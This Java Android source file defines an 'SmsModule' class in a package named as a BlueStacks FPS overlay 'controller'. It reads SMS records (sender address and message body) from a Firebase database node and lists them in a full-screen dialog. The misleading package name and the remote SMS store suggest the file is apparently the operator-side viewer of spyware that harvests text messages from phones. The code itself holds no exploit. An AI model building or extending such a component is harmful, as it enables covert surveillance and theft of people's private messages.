package com.bluestacks.fpsoverlay.controller;

import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ValueEventListener;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsModule {
    private final Context context;
    private final DatabaseReference dataRef;

    public SmsModule(Context context, DatabaseReference dataRef) {
        this.context = context;
        this.dataRef = dataRef;
    }

    public void showDialog() {
        View view = LayoutInflater.from(context).inflate(R.layout.dialog_list, null);
        TextView titleText = view.findViewById(R.id.dialogTitle);
        RecyclerView rv = view.findViewById(R.id.recyclerView);
        titleText.setText("SMS Messages");

        rv.setLayoutManager(new LinearLayoutManager(context));
        GenericAdapter adapter = new GenericAdapter();
        rv.setAdapter(adapter);

        AlertDialog dialog = new AlertDialog.Builder(context, R.style.Theme_MaterialComponents_Light_NoActionBar_FullScreen)
                .setView(view).create();
        view.findViewById(R.id.btnClose).setOnClickListener(v -> dialog.dismiss());

        dataRef.child("sms").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<Map<String, String>> dataList = new ArrayList<>();
                for (DataSnapshot ds : snapshot.getChildren()) {
                    Map<String, String> m = new HashMap<>();
                    m.put("title", ds.child("address").getValue(String.class));
                    m.put("sub", ds.child("body").getValue(String.class));
                    m.put("type", "sms");
                    dataList.add(m);
                }
                adapter.setData(dataList);
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });

        dialog.show();
    }
}